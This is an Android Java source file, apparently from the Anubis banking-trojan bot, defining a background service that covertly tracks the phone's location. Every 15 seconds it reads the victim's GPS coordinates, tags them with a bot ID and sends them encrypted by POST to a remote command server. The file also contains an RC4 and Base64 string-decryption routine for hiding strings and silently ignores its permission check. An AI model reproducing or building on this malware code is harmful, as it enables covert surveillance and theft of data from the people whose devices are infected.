package anubis.bot.myapplication;

import android.Manifest;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;

public class ServiceGeolocationGPS extends Service {
    UtilsClass SF = new UtilsClass();
    public ServiceGeolocationGPS() {
    }
    public LocationManager locationManager;

    @Override
    public IBinder onBind(Intent intent) {return null;}

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);

        try {

            int res;
            res = checkCallingOrSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION);
            if (!(res == PackageManager.PERMISSION_GRANTED)){}
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000 * 15, 10, locationListener);
        }catch (Exception ex){
        }
        return flags;
    }

    private LocationListener locationListener = new LocationListener() {
        @Override
        public void onLocationChanged(Location location) {
            showLocation(location);
        }
        @Override
        public void onProviderDisabled(String provider) {
        }
        @Override
        public void onProviderEnabled(String provider) {
        }

        @Override
        public void onStatusChanged(String provider, int status, Bundle extras) {}
    };

    private void showLocation(Location location) {
        if (location == null)
            return;
        if (location.getProvider().equals(LocationManager.GPS_PROVIDER)) {
            SF.POST(this,"5", "p=" + SF.trafEnCr(SF.ID_B(this)+":"+formatLocation(location)+":GPS:"));
        }
    }
    private String formatLocation(Location location){
        if (location == null)
            return "";

        String s = String.format("%1$.4f:%2$.4f", location.getLatitude(), location.getLongitude());
        s = s.replace(",",".");
        return s;
    }
}
